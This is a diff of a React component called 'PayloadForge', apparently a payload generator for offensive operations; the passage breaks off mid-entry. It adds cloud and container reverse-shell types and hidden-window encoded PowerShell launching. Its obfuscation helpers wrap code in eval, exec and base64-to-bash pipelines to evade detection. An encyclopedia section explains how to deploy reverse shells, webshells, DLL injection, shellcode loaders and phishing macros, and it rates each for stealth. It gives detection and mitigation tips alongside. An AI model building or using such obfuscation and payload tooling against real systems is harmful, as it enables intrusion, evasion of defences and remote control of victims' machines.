@@ -1,16 +1,12 @@
-// PayloadForge.tsx
-import { useState, useEffect, useMemo, useRef } from 'react'
+import React, { useState, useEffect, useMemo, useRef } from 'react';
 import {
-  Swords, Copy, Download, Zap,
-  Code, Eye, EyeOff, Shield, Target,
-  Globe, Server, Wifi, BookOpen, Play,
-  ChevronDown, ChevronUp, Lightbulb,
-  AlertCircle, CheckCircle,
-  Layers, FileCode, Lock, Unlock,
-  Terminal, Network, GitMerge, Database,
-  Hash, Activity, ShieldAlert,
-  Key, Plus, Clock,
-  Hammer} from 'lucide-react'
+  Swords, Copy, Download, Zap, Code, Eye, EyeOff, Shield, Target,
+  Globe, Server, Wifi, BookOpen, Play, ChevronDown, ChevronUp, Lightbulb,
+  AlertCircle, CheckCircle, Layers, FileCode, Lock, Unlock, Terminal,
+  Network, GitMerge, Database, Hash, Activity, ShieldAlert, Key, Plus, Clock,
+  Hammer, GraduationCap, Award, Cpu, Cloud, Braces,
+  Scan, ExternalLink, Star
+} from 'lucide-react';
 
 // ─── Types ────────────────────────────────────────────────
 type PayloadType =
@@ -51,6 +47,13 @@ type PayloadType =
   | 'task_scheduler_persistence'
   | 'registry_persistence'
   | 'service_persistence'
+  | 'aws_ec2_reverse'
+  | 'gcp_compute_reverse'
+  | 'azure_vm_reverse'
+  | 'docker_reverse'
+  | 'kubernetes_exec'
+  | 'python_websocket_shell'
+  | 'rust_reverse';
 
 type OutputFormat =
   | 'powershell'
@@ -70,33 +73,38 @@ type OutputFormat =
   | 'hta'
   | 'xml'
   | 'inf'
+  | 'rust';
 
-type ObfuscationLevel = 'none' | 'light' | 'medium' | 'heavy'
+type ObfuscationLevel = 'none' | 'light' | 'medium' | 'heavy';
 
 // ─── Interfaces ────────────────────────────────────────────
 interface PayloadInfo {
-  type: PayloadType
-  name: string
-  category: string
-  description: string
-  whatItDoes: string
-  howToUse: string
-  whereToUse: string
-  pros: string[]
-  cons: string[]
-  icon: React.ReactNode
-  color: string
-  defaultPort: number
-  requiresLhost: boolean
-  requiresLport: boolean
-  supportedFormats: OutputFormat[]
-  howItWorks: string
-  exampleScenario: string
-  commonListenerCommand: string
-  detectionIndicators: string[]
-  mitigationTips: string[]
-  references: string[]
-  isComplete: boolean
+  type: PayloadType;
+  name: string;
+  category: string;
+  description: string;
+  whatItDoes: string;
+  howToUse: string;
+  whereToUse: string;
+  pros: string[];
+  cons: string[];
+  icon: React.ReactNode;
+  color: string;
+  defaultPort: number;
+  requiresLhost: boolean;
+  requiresLport: boolean;
+  supportedFormats: OutputFormat[];
+  howItWorks: string;
+  exampleScenario: string;
+  commonListenerCommand: string;
+  detectionIndicators: string[];
+  mitigationTips: string[];
+  references: string[];
+  isComplete: boolean;
+  labVsReal: string;
+  detectionComplexity: 'Low' | 'Medium' | 'High';
+  stealthRating: 'Low' | 'Medium' | 'High';
+  reliabilityRating: 'Low' | 'Medium' | 'High';
 }
 
 // ─── Constants ─────────────────────────────────────────────
@@ -118,7 +126,8 @@ const FORMAT_EXTENSIONS: Partial<Record<OutputFormat, string>> = {
   hta: 'hta',
   xml: 'xml',
   inf: 'inf',
-}
+  rust: 'rs',
+};
 
 const FORMAT_MIMES: Partial<Record<OutputFormat, string>> = {
   python: 'text/x-python',
@@ -138,130 +147,144 @@ const FORMAT_MIMES: Partial<Record<OutputFormat, string>> = {
   go: 'text/x-go',
   raw_c: 'text/x-c',
   inf: 'text/plain',
-}
+  rust: 'text/x-rust',
+};
 
-const OBFUSCATION_SUPPORTED_FORMATS: OutputFormat[] = ['powershell', 'python', 'csharp', 'javascript', 'bash', 'perl', 'ruby']
-const STORAGE_KEY = 'payloadforge_config'
+const OBFUSCATION_SUPPORTED_FORMATS: OutputFormat[] = [
+  'powershell', 'python', 'csharp', 'javascript', 'bash', 'perl', 'ruby',
+];
+const STORAGE_KEY = 'payloadforge_config_v2';
 
-type TimerHandle = ReturnType<typeof setTimeout>
+type TimerHandle = ReturnType<typeof setTimeout>;
 
 // ─── Obfuscation Helpers ──────────────────────────────────
 function utf8ToBase64(str: string): string {
-  const bytes = new TextEncoder().encode(str)
-  let binary = ''
+  const bytes = new TextEncoder().encode(str);
+  let binary = '';
   for (let i = 0; i < bytes.length; i++) {
-    binary += String.fromCharCode(bytes[i])
+    binary += String.fromCharCode(bytes[i]);
   }
-  return btoa(binary)
+  return btoa(binary);
+}
+
+function utf16LeToBase64(str: string): string {
+  const bytes = new Uint8Array(str.length * 2);
+  for (let i = 0; i < str.length; i++) {
+    const c = str.charCodeAt(i);
+    bytes[i * 2] = c & 0xff;
+    bytes[i * 2 + 1] = c >> 8;
+  }
+  let binary = '';
+  for (let i = 0; i < bytes.length; i++) binary += String.fromCharCode(bytes[i]);
+  return btoa(binary);
 }
 
 function obfuscatePowerShell(code: string, level: ObfuscationLevel): string {
-  if (level === 'none') return code
+  if (level === 'none') return code;
 
   if (level === 'light') {
-    const b64 = utf8ToBase64(code)
-    return `powershell -EncodedCommand ${b64}`
+    const body = code.replace(/^\/\/.*$/gm, '').trim();
+    const b64 = utf16LeToBase64(body);
+    return `powershell -NoP -NonI -W Hidden -EncodedCommand ${b64}`;
   }
 
   if (level === 'medium') {
-    const chars = code.split('').map(c => `[char]${c.charCodeAt(0)}`)
-    const charArray = chars.join('+')
-    return `$code = ${charArray}; IEX $code`
+    const chars = code.split('').map(c => `[char]${c.charCodeAt(0)}`);
+    const charArray = chars.join('+');
+    return `$code = ${charArray}; IEX $code`;
   }
 
   if (level === 'heavy') {
-    const chars = code.split('').map(c => `[char]${c.charCodeAt(0)}`)
-    const charArray = chars.join('+')
-    const funcName = '_' + Math.random().toString(36).substring(2, 10)
-    return `function ${funcName} { $code = ${charArray}; IEX $code }; ${funcName}`
+    const chars = code.split('').map(c => `[char]${c.charCodeAt(0)}`);
+    const charArray = chars.join('+');
+    const funcName = '_' + Math.random().toString(36).substring(2, 10);
+    return `function ${funcName} { $code = ${charArray}; IEX $code }; ${funcName}`;
   }
 
-  return code
+  return code;
 }
 
 function obfuscatePython(code: string, level: ObfuscationLevel): string {
-  if (level === 'none') return code
+  if (level === 'none') return code;
 
   if (level === 'light') {
-    const b64 = utf8ToBase64(code)
-    return `import base64;exec(base64.b64decode("${b64}").decode())`
+    const b64 = utf8ToBase64(code);
+    return `import base64;exec(base64.b64decode("${b64}").decode())`;
   }
 
   if (level === 'medium') {
-    const chars = code.split('').map(c => `chr(${c.charCodeAt(0)})`)
-    return `exec(''.join([${chars.join(',')}]))`
+    const chars = code.split('').map(c => `chr(${c.charCodeAt(0)})`);
+    return `exec(''.join([${chars.join(',')}]))`;
   }
 
   if (level === 'heavy') {
-    const chunkSize = 32
-    const chunks: string[] = []
+    const chunkSize = 32;
+    const chunks: string[] = [];
     for (let i = 0; i < code.length; i += chunkSize) {
-      chunks.push(code.slice(i, i + chunkSize))
+      chunks.push(code.slice(i, i + chunkSize));
     }
-    const xorKey = Math.floor(Math.random() * 255) + 1
-    const encoded = chunks.map((chunk) => 
+    const xorKey = Math.floor(Math.random() * 255) + 1;
+    const encoded = chunks.map((chunk) =>
       Array.from(chunk).map(ch => `(chr(${ch.charCodeAt(0) ^ xorKey}))`).join(',')
-    )
-    const varName = '_' + Math.random().toString(36).slice(2, 10)
-    const extendLines = encoded.map((c) => `${varName}.extend([${c}])`).join('\n')
+    );
+    const varName = '_' + Math.random().toString(36).slice(2, 10);
+    const extendLines = encoded.map((c) => `${varName}.extend([${c}])`).join('\n');
     return `
 ${varName} = []
 ${extendLines}
 exec(''.join(chr((ord(c) ^ ${xorKey})) for c in ''.join(${varName})))
-`
+`;
   }
 
-  return code
+  return code;
 }
 
 function obfuscateCSharp(code: string, level: ObfuscationLevel): string {
-  if (level === 'none') return code
-  
+  if (level === 'none') return code;
   if (level === 'light') {
-    return `// C# obfuscation not fully implemented - use as-is\n${code}`
+    return `// C# obfuscation: use ConfuserEx or similar tools for production\n${code}`;
   }
-  
-  return `// C# obfuscation not implemented - use code as-is\n${code}`
+  return `// C# obfuscation: use ConfuserEx, Agile.NET, or similar\n${code}`;
 }
 
 function obfuscateJavaScript(code: string, level: ObfuscationLevel): string {
-  if (level === 'none') return code
+  if (level === 'none') return code;
 
   if (level === 'light') {
-    const b64 = utf8ToBase64(code)
-    return `eval(atob("${b64}"))`
+    const b64 = utf8ToBase64(code);
+    return `eval(atob("${b64}"))`;
   }
 
   if (level === 'medium') {
-    const chars = code.split('').map(c => `String.fromCharCode(${c.charCodeAt(0)})`)
-    return `eval(${chars.join('+')})`
+    const chars = code.split('').map(c => `String.fromCharCode(${c.charCodeAt(0)})`);
+    return `eval(${chars.join('+')})`;
   }
 
   if (level === 'heavy') {
-    const chars = code.split('').map(c => `String.fromCharCode(${c.charCodeAt(0)})`)
-    const fnName = '_' + Math.random().toString(36).slice(2, 10)
-    return `(function ${fnName}(){var s=${chars.join('+')}; eval(s);})();`
+    const chars = code.split('').map(c => `String.fromCharCode(${c.charCodeAt(0)})`);
+    const fnName = '_' + Math.random().toString(36).slice(2, 10);
+    return `(function ${fnName}(){var s=${chars.join('+')}; eval(s);})();`;
   }
 
-  return code
+  return code;
 }
 
 function obfuscateBash(code: string, level: ObfuscationLevel): string {
-  if (level === 'none') return code
-  const b64 = utf8ToBase64(code)
-  return `echo "${b64}" | base64 -d | bash`
+  if (level === 'none') return code;
+  const b64 = utf8ToBase64(code);
+  return `echo "${b64}" | base64 -d | bash`;
 }
 
 function obfuscatePerl(code: string, level: ObfuscationLevel): string {
-  if (level === 'none') return code
-  const b64 = utf8ToBase64(code)
-  return `echo "${b64}" | base64 -d | perl`
+  if (level === 'none') return code;
+  const b64 = utf8ToBase64(code);
+  return `echo "${b64}" | base64 -d | perl`;
 }
 
 function obfuscateRuby(code: string, level: ObfuscationLevel): string {
-  if (level === 'none') return code
-  const b64 = utf8ToBase64(code)
-  return `echo "${b64}" | base64 -d | ruby`
+  if (level === 'none') return code;
+  const b64 = utf8ToBase64(code);
+  return `echo "${b64}" | base64 -d | ruby`;
 }
 
 function obfuscateCode(
@@ -269,45 +292,45 @@ function obfuscateCode(
   format: OutputFormat,
   level: ObfuscationLevel
 ): string {
-  if (level === 'none') return code
+  if (level === 'none') return code;
 
   if (!OBFUSCATION_SUPPORTED_FORMATS.includes(format)) {
-    return code
+    return code;
   }
 
   switch (format) {
     case 'powershell':
-      return obfuscatePowerShell(code, level)
+      return obfuscatePowerShell(code, level);
     case 'python':
-      return obfuscatePython(code, level)
+      return obfuscatePython(code, level);
     case 'csharp':
-      return obfuscateCSharp(code, level)
+      return obfuscateCSharp(code, level);
     case 'javascript':
-      return obfuscateJavaScript(code, level)
+      return obfuscateJavaScript(code, level);
     case 'bash':
-      return obfuscateBash(code, level)
+      return obfuscateBash(code, level);
     case 'perl':
-      return obfuscatePerl(code, level)
+      return obfuscatePerl(code, level);
     case 'ruby':
-      return obfuscateRuby(code, level)
+      return obfuscateRuby(code, level);
     default:
-      return code
+      return code;
   }
 }
 
 function renderReferences(references: string[]) {
   return references.map((ref, i) => (
     <li key={i}>
-      <a 
-        href={ref} 
-        target="_blank" 
+      <a
+        href={ref}
+        target="_blank"
         rel="noopener noreferrer"
-        className="text-cyan-400 hover:underline break-all"
+        className="text-cyan-400 hover:underline break-all text-xs"
       >
         {ref}
       </a>
     </li>
-  ))
+  ));
 }
 
 function substituteListener(command: string, lhost: string, lport: number): string {
@@ -317,7 +340,7 @@ function substituteListener(command: string, lhost: string, lport: number): stri
     .replace(/\$LHOST\b/gi, lhost)
     .replace(/\$LPORT\b/gi, String(lport))
     .replace(/\$lhost\b/gi, lhost)
-    .replace(/\$lport\b/gi, String(lport))
+    .replace(/\$lport\b/gi, String(lport));
 }
 
 // ─── Encyclopedia ──────────────────────────────────────────
@@ -327,33 +350,37 @@ const PAYLOAD_ENCYCLOPEDIA: PayloadInfo[] = [
     type: 'reverse_shell',
     name: 'Reverse Shell',
     category: 'Reverse Shells',
-    description: 'The target connects back to your listener.',
-    whatItDoes: 'Opens a connection from the compromised machine back to your attacking machine. Gives you a command shell.',
+    description: 'The target connects back to your listener — the classic lab staple.',
+    whatItDoes: 'Opens a connection from the compromised machine back to your attacking machine, giving you a command shell.',
     howToUse: 'Start a listener (nc -lvnp ${lport}), generate the payload, execute it on the target.',
     whereToUse: 'Internal networks, after initial access, when outbound connections are allowed.',
     pros: ['Very reliable', 'Works through firewalls (outbound)', 'Easy to set up', 'Works on almost all platforms'],
-    cons: ['Requires outbound access from target', 'Can be blocked by strict egress filtering'],
+    cons: ['Requires outbound access from target', 'Can be blocked by strict egress filtering', 'Plaintext traffic'],
     icon: <Wifi size={18} />,
     color: 'text-emerald-400',
     defaultPort: 4444,
     requiresLhost: true,
     requiresLport: true,
-    supportedFormats: ['powershell', 'python', 'go', 'raw_c', 'csharp', 'bash', 'perl', 'ruby'],
+    supportedFormats: ['powershell', 'python', 'go', 'raw_c', 'csharp', 'bash', 'perl', 'ruby', 'rust'],
     howItWorks: 'Opens a TCP socket to LHOST:LPORT, duplicates descriptors, spawns a shell.',
     exampleScenario: 'Upload a reverse shell script to a web server to get a shell back.',
     commonListenerCommand: 'nc -lvnp ${lport}',
     detectionIndicators: [
       'Outbound connections to unusual ports',
       'Process spawning cmd.exe or /bin/sh with network activity',
-      'Anomalous parent-child process relationships'
+      'Anomalous parent-child process relationships',
     ],
     mitigationTips: [
       'Implement strict egress filtering',
       'Monitor for suspicious outbound connections',
-      'Enable PowerShell logging'
+      'Enable PowerShell logging',
     ],
     references: ['https://attack.mitre.org/techniques/T1071/', 'https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet'],
-    isComplete: true
+    isComplete: true,
+    labVsReal: 'In a lab, this is the go-to for quick access. In real red team ops, it\'s often used as a fallback when more stealthy C2 channels fail. Plaintext versions are rarely used in mature engagements.',
+    detectionComplexity: 'Low',
+    stealthRating: 'Low',
+    reliabilityRating: 'High',
   },
   // 2. Meterpreter
   {
@@ -365,7 +392,7 @@ const PAYLOAD_ENCYCLOPEDIA: PayloadInfo[] = [
     howToUse: 'Use with Metasploit handler. Generate payload → execute on target → interact via msfconsole.',
     whereToUse: 'When you need advanced post‑exploitation capabilities.',
     pros: ['Extremely powerful post‑exploitation', 'Built‑in modules', 'Session management', 'Great for pivoting'],
-    cons: ['Larger footprint', 'Easier to detect than simple shells', 'Requires Metasploit'],
+    cons: ['Larger footprint', 'Easier to detect than simple shells', 'Requires Metasploit', 'Heavily signatured'],
     icon: <Layers size={18} />,
     color: 'text-cyan-400',
     defaultPort: 4444,
@@ -378,15 +405,19 @@ const PAYLOAD_ENCYCLOPEDIA: PayloadInfo[] = [
     detectionIndicators: [
       'Unusual process injection (reflective DLL loading)',
       'Encrypted network traffic over non‑standard ports',
-      'Presence of known Meterpreter extensions'
+      'Presence of known Meterpreter extensions',
     ],
     mitigationTips: [
       'Enable Windows Defender Application Guard and Controlled Folder Access',
       'Monitor for suspicious named pipes or mutexes',
-      'Use EDR with behavioral detection'
+      'Use EDR with behavioral detection',
     ],
     references: ['https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/', 'https://attack.mitre.org/software/S0184/'],
-    isComplete: false
+    isComplete: false,
+    labVsReal: 'Meterpreter is heavily used in CTF and training. In real red teams, it\'s often replaced by custom C2 (like Cobalt Strike) due to its heavy signature footprint, though it still appears in some engagements.',
+    detectionComplexity: 'Medium',
+    stealthRating: 'Medium',
+    reliabilityRating: 'High',
   },
   // 3. Bind Shell
   {
@@ -404,28 +435,32 @@ const PAYLOAD_ENCYCLOPEDIA: PayloadInfo[] = [
     defaultPort: 4444,
     requiresLhost: false,
     requiresLport: true,
-    supportedFormats: ['powershell', 'csharp', 'raw_c', 'python'],
+    supportedFormats: ['powershell', 'csharp', 'raw_c', 'python', 'bash'],
     howItWorks: 'Binds to a port, waits for incoming connection, duplicates descriptors, spawns shell.',
     exampleScenario: 'Deploy a bind shell in a segmented network where you can reach the target directly via VPN.',
     commonListenerCommand: 'nc <target-ip> ${lport}',
     detectionIndicators: [
       'Listening ports that are not typical for the system',
-      'Processes listening on ports and spawning child processes'
+      'Processes listening on ports and spawning child processes',
     ],
     mitigationTips: [
       'Block inbound connections from untrusted networks',
       'Use host‑based firewalls to restrict listening ports',
-      'Monitor for anomalous port binding using Sysmon'
+      'Monitor for anomalous port binding using Sysmon',
     ],
     references: ['https://attack.mitre.org/techniques/T1071/'],
-    isComplete: true
+    isComplete: true,
+    labVsReal: 'Bind shells are great in labs where you have direct network access. In real engagements, they\'re less common because inbound connections are heavily monitored and firewalled.',
+    detectionComplexity: 'Low',
+    stealthRating: 'Low',
+    reliabilityRating: 'Medium',
   },
   // 4. WebShell
   {
     type: 'webshell',
     name: 'WebShell',
     category: 'Web Shells',
-    description: 'A web‑based shell uploaded to a web server.',
+    description: 'A web‑based shell uploaded to a web server — the ultimate persistence tool.',
     whatItDoes: 'A script that allows remote command execution via a web browser or curl.',
     howToUse: 'Upload to a vulnerable web application, then access via URL with parameters.',
     whereToUse: 'After finding file upload vulnerabilities, web app exploitation, or for persistence.',
@@ -443,22 +478,26 @@ const PAYLOAD_ENCYCLOPEDIA: PayloadInfo[] = [
     detectionIndicators: [
       'Suspicious scripts in web directories',
       'Unusual parameters (cmd, exec, system) in web logs',
-      'Outbound connections from web server processes'
+      'Outbound connections from web server processes',
     ],
     mitigationTips: [
       'Disable unnecessary file uploads and restrict allowed file types',
       'Monitor web server logs for anomalous requests',
-      'Use Web Application Firewalls (WAF)'
+      'Use Web Application Firewalls (WAF)',
     ],
     references: ['https://attack.mitre.org/techniques/T1505/'],
-    isComplete: true
+    isComplete: true,
+    labVsReal: 'WebShells are frequently used in both labs and real engagements. In real red teams, they\'re often used as a persistence mechanism after initial compromise, sometimes obfuscated to evade WAFs.',
+    detectionComplexity: 'Medium',
+    stealthRating: 'Medium',
+    reliabilityRating: 'High',
   },
   // 5. DLL Injection
   {
     type: 'dll_inject',
     name: 'DLL Injection',
     category: 'AppLocker / EDR Bypass',
-    description: 'Injects malicious code into a running process.',
+    description: 'Injects malicious code into a running process — stealthy and powerful.',
     whatItDoes: 'Loads a malicious DLL into the memory of another process to execute code.',
     howToUse: 'Generate DLL → Use injection technique (Process Hollowing, Reflective DLL Injection, etc.) to load it.',
     whereToUse: 'Advanced persistence, process migration, evading detection.',
@@ -476,15 +515,19 @@ const PAYLOAD_ENCYCLOPEDIA: PayloadInfo[] = [
     detectionIndicators: [
       'Unusual API calls (VirtualAllocEx, WriteProcessMemory, CreateRemoteThread)',
       'DLLs loaded from non‑standard paths',
-      'Process injection events (e.g., Sysmon event 8)'
+      'Process injection events (e.g., Sysmon event 8)',
     ],
     mitigationTips: [
       'Enable Process Mitigation Policies',
       'Monitor for cross‑process memory writes',
-      'Use EDR with memory scanning'
+      'Use EDR with memory scanning',
     ],
     references: ['https://attack.mitre.org/techniques/T1055/'],
-    isComplete: false
+    isComplete: false,
+    labVsReal: 'DLL injection is a staple in advanced labs and real red team operations. In real engagements, it\'s often combined with other techniques like process hollowing to evade EDR.',
+    detectionComplexity: 'High',
+    stealthRating: 'High',
+    reliabilityRating: 'Medium',
   },
   // 6. Shellcode
   {
@@ -502,29 +545,33 @@ const PAYLOAD_ENCYCLOPEDIA: PayloadInfo[] = [
     defaultPort: 4444,
     requiresLhost: true,
     requiresLport: true,
-    supportedFormats: ['raw_c', 'python', 'go'],
+    supportedFormats: ['raw_c', 'python', 'go', 'rust'],
     howItWorks: 'Position‑independent byte sequence that, when executed, performs a specific action (spawns a shell or connects back).',
     exampleScenario: 'Use shellcode as payload in a buffer overflow exploit to get a reverse shell.',
     commonListenerCommand: 'nc -lvnp ${lport}',
     detectionIndicators: [
       'Memory regions with R/W/X permissions',
       'Suspicious shellcode patterns (long NOP sleds)',
-      'Anomalous execution flow from known exploited applications'
+      'Anomalous execution flow from known exploited applications',
     ],
     mitigationTips: [
       'Enable ASLR, DEP, and Control Flow Guard',
       'Harden applications against memory corruption',
-      'Use exploit mitigation tools'
+      'Use exploit mitigation tools',
     ],
     references: ['https://attack.mitre.org/techniques/T1059/'],
-    isComplete: false
+    isComplete: false,
+    labVsReal: 'Shellcode is the foundation of many exploits in both labs and real engagements. In real red teams, it\'s often used in custom loaders to avoid signature detection.',
+    detectionComplexity: 'High',
+    stealthRating: 'High',
+    reliabilityRating: 'Medium',
   },
   // 7. Macro
   {
     type: 'macro',
     name: 'Macro (VBA)',
     category: 'Initial Access / Phishing',
-    description: 'Malicious macro embedded in Office documents for phishing.',
+    description: 'Malicious macro embedded in Office documents — the classic phishing vector.',
     whatItDoes: 'When the victim enables macros, it executes code to download and run a payload.',
     howToUse: 'Generate macro → Embed in Office document → Send via phishing email.',
     whereToUse: 'Phishing campaigns, initial access operations.',
@@ -542,15 +589,19 @@ const PAYLOAD_ENCYCLOPEDIA: PayloadInfo[] = [
     detectionIndicators: [
       'Office processes spawning cmd.exe or powershell.exe',
       'Office files with suspicious macros (AutoOpen)',
-      'Unusual network connections from Office applications'
+      'Unusual network connections from Office applications',
     ],
     mitigationTips: [
       'Disable macros by default in Office (Group Policy)',
       'Use Office 365 advanced threat protection',
-      'Educate users about enabling macros only from trusted sources'
+      'Educate users about enabling macros only from trusted sources',
     ],
     references: ['https://attack.mitre.org/techniques/T1059/'],
-    isComplete: false
+    isComplete: false,
+    labVsReal: 'Macros are a classic lab and real-world initial access vector. Real red teams often use them in the early stages of a campaign, though modern EDR has made them harder to execute successfully.',
+    detectionComplexity: 'Medium',
+    stealthRating: 'Low',
+    reliabilityRating: 'Medium',
   },
   // 8. HTA
   {
@@ -575,15 +626,19 @@ const PAYLOAD_ENCYCLOPEDIA: PayloadInfo[] = [
     detectionIndicators: [
       'mshta.exe spawning unusual child processes (cmd.exe, powershell.exe)',
       'Network connections from mshta.exe to remote IPs',
-      'HTA files with obfuscated JavaScript'
+      'HTA files with obfuscated JavaScript',
     ],
     mitigationTips: [
       'Block mshta.exe from running via AppLocker or WDAC',
       'Monitor mshta.exe child process creation',
-      'Consider disabling HTA functionality if not needed'
+      'Consider disabling HTA functionality if not needed',
     ],
     references: ['https://attack.mitre.org/techniques/T1218/'],
-    isComplete: false
+    isComplete: false,
+    labVsReal: 'HTA is a common lab technique and still appears in real phishing campaigns, though it\'s increasingly detected by modern EDR.',
+    detectionComplexity: 'Medium',
+    stealthRating: 'Low',
+    reliabilityRating: 'Medium',
   },
   // 9. Reverse HTTPS
   {
@@ -608,15 +663,19 @@ const PAYLOAD_ENCYCLOPEDIA: PayloadInfo[] = [
     detectionIndicators: [
       'Outbound connections to unusual HTTPS destinations',
       'TLS certificate anomalies',
-      'Processes initiating HTTPS connections and spawning shells'
+      'Processes initiating HTTPS connections and spawning shells',
     ],
     mitigationTips: [
       'Implement SSL/TLS decryption at the perimeter',
       'Monitor for anomalous HTTPS traffic patterns',
-      'Use application‑layer firewalls to inspect HTTPS payloads'
+      'Use application‑layer firewalls to inspect HTTPS payloads',
     ],
     references: ['https://attack.mitre.org/techniques/T1572/'],
-    isComplete: false
+    isComplete: false,
+    labVsReal: 'Reverse HTTPS is heavily used in both labs and real engagements. Real red teams often use it as a primary C2 channel due to its ability to blend in with normal traffic.',
+    detectionComplexity: 'High',
+    stealthRating: 'High',
+    reliabilityRating: 'High',
   },
   // 10. Reverse HTTP
   {
@@ -641,15 +700,19 @@ const PAYLOAD_ENCYCLOPEDIA: PayloadInfo[] = [
     detectionIndicators: [
       'Frequent GET/POST requests with unusual user‑agents or payload patterns',
       'Large outbound HTTP requests',
-      'Processes generating HTTP traffic and spawning shells'
+      'Processes generating HTTP traffic and spawning shells',
     ],
     mitigationTips: [
       'Inspect HTTP traffic for suspicious parameters and headers',
       'Implement egress filtering to limit outbound HTTP to known destinations',
-      'Use web proxies with threat intelligence feeds'
+      'Use web proxies with threat intelligence feeds',
     ],
     references: ['https://attack.mitre.org/techniques/T1071.001/'],
-    isComplete: false
+    isComplete: false,
+    labVsReal: 'Reverse HTTP is common in labs. In real engagements, it\'s less used due to its plaintext nature, but can be effective in environments with deep HTTPS inspection that breaks SSL.',
+    detectionComplexity: 'Medium',
+    stealthRating: 'Medium',
+    reliabilityRating: 'High',
   },
   // 11. Bind HTTPS
   {
@@ -674,15 +737,19 @@ const PAYLOAD_ENCYCLOPEDIA: PayloadInfo[] = [
     detectionIndicators: [
       'Listening ports with SSL/TLS certificates',
       'Unusual certificate fingerprints',
-      'Processes listening on non‑standard ports with SSL'
+      'Processes listening on non‑standard ports with SSL',
     ],
     mitigationTips: [
       'Block inbound SSL connections to internal hosts',
       'Monitor for new TLS certificates on internal servers',
-      'Use host‑based firewalls to restrict listening ports'
+      'Use host‑based firewalls to restrict listening ports',
     ],
     references: ['https://attack.mitre.org/techniques/T1572/'],
-    isComplete: false
+    isComplete: false,
+    labVsReal: 'Bind HTTPS is rarely used in real engagements due to the difficulty of inbound connections, but appears in labs where network segmentation is less strict.',
+    detectionComplexity: 'High',
+    stealthRating: 'High',
+    reliabilityRating: 'Low',
   },
   // 12. Java WebShell
   {
@@ -707,15 +774,19 @@ const PAYLOAD_ENCYCLOPEDIA: PayloadInfo[] = [
     detectionIndicators: [
       'JSP files in web directories with suspicious content',
       'Requests with cmd parameter pointing to JSP files',
-      'Tomcat/JVM processes spawning child processes'
+      'Tomcat/JVM processes spawning child processes',
     ],
     mitigationTips: [
       'Harden web application servers (restrict file uploads)',
       'Monitor web application logs for suspicious requests',
-      'Use WAF to block known JSP webshell signatures'
+      'Use WAF to block known JSP webshell signatures',
     ],
     references: ['https://attack.mitre.org/techniques/T1505.003/'],
-    isComplete: true
+    isComplete: true,
+    labVsReal: 'JSP webshells are common in both labs and real engagements targeting Java-based applications. Real red teams often use them for persistence in enterprise Java environments.',
+    detectionComplexity: 'Medium',
+    stealthRating: 'Medium',
+    reliabilityRating: 'High',
   },
   // 13. ASPX WebShell
   {
@@ -740,15 +811,19 @@ const PAYLOAD_ENCYCLOPEDIA: PayloadInfo[] = [
     detectionIndicators: [
       'ASPX files with suspicious code in web directories',
       'Unusual parameters in HTTP requests to ASPX files',
-      'IIS worker processes spawning child processes'
+      'IIS worker processes spawning child processes',
     ],
     mitigationTips: [
       'Restrict file uploads in IIS',
       'Monitor IIS logs for anomalous requests',
-      'Use WAF with .NET‑specific rules'
+      'Use WAF with .NET‑specific rules',
     ],
     references: ['https://attack.mitre.org/techniques/T1505.003/'],
-    isComplete: true
+    isComplete: true,
+    labVsReal: 'ASPX webshells are common in Windows-centric enterprise environments. Real red teams frequently use them for persistence on IIS servers.',
+    detectionComplexity: 'Medium',
+    stealthRating: 'Medium',
+    reliabilityRating: 'High',
   },
   // 14. Encrypted Shell
   {
@@ -773,15 +848,19 @@ const PAYLOAD_ENCYCLOPEDIA: PayloadInfo[] = [
     detectionIndicators: [
       'Unusual entropy in network packets (high randomness)',
       'Processes performing cryptographic operations',
-      'Custom protocols over non‑standard ports'
+      'Custom protocols over non‑standard ports',
     ],
     mitigationTips: [
       'Deploy network traffic analysis with anomaly detection',
       'Monitor for unusual encryption patterns',
-      'Implement host‑based detection for known encryption libraries'
+      'Implement host‑based detection for known encryption libraries',
     ],
     references: ['https://attack.mitre.org/techniques/T1573/'],
-    isComplete: false
+    isComplete: false,
+    labVsReal: 'Encrypted shells are a staple of advanced labs and real red team operations. Real teams often use custom encryption to evade detection.',
+    detectionComplexity: 'High',
+    stealthRating: 'High',
+    reliabilityRating: 'Medium',
   },
   // 15. Encoded PowerShell
   {
@@ -806,22 +885,26 @@ const PAYLOAD_ENCYCLOPEDIA: PayloadInfo[] = [
     detectionIndicators: [
       'PowerShell command line with -EncodedCommand',
       'Suspicious base64 strings in command line',
-      'PowerShell spawning network connections'
+      'PowerShell spawning network connections',
     ],
     mitigationTips: [
       'Log and monitor PowerShell command lines',
       'Enable PowerShell script block logging',
-      'Block PowerShell if not needed'
+      'Block PowerShell if not needed',
     ],
     references: ['https://attack.mitre.org/techniques/T1059.001/'],
-    isComplete: false
+    isComplete: false,
+    labVsReal: 'Encoded PowerShell is a common lab technique and still appears in real phishing and initial access campaigns, though modern EDR often detects it.',
+    detectionComplexity: 'Medium',
+    stealthRating: 'Low',
+    reliabilityRating: 'Medium',
   },
   // 16. C# Loader
   {
     type: 'csharp_loader',
     name: 'C# Loader',
     category: 'Reverse Shells',
-    description: 'C# executable that loads and executes shellcode.',
+    description: 'C# executable that loads and executes shellcode — a modern EDR evasion staple.',
     whatItDoes: 'A compiled .NET executable that uses Windows API to allocate memory, copy shellcode, and execute it.',
     howToUse: 'Generate the loader, compile it, and run it on the target.',
     whereToUse: 'When you need a small, custom executable to bypass AV by using shellcode.',
@@ -839,22 +922,26 @@ const PAYLOAD_ENCYCLOPEDIA: PayloadInfo[] = [
     detectionIndicators: [
       'Processes with RWX memory regions',
       'Unusual .NET assemblies loaded',
-      'API calls to VirtualAlloc and CreateThread'
+      'API calls to VirtualAlloc and CreateThread',
     ],
     mitigationTips: [
       'Enable AMSI and .NET ETW monitoring',
       'Use EDR that can detect shellcode injection',
-      'Restrict execution of unsigned .NET executables'
+      'Restrict execution of unsigned .NET executables',
     ],
     references: ['https://attack.mitre.org/techniques/T1055/'],
-    isComplete: false
+    isComplete: false,
+    labVsReal: 'C# loaders are extremely common in both labs and real red team operations. They are a go-to technique for executing shellcode in memory while evading disk-based detection.',
+    detectionComplexity: 'High',
+    stealthRating: 'High',
+    reliabilityRating: 'High',
   },
   // 17. DNS Shell
   {
     type: 'dns_shell',
     name: 'DNS Shell',
     category: 'Covert Channels',
-    description: 'Exfiltrates data and receives commands via DNS queries.',
+    description: 'Exfiltrates data and receives commands via DNS queries — the ultimate stealth channel.',
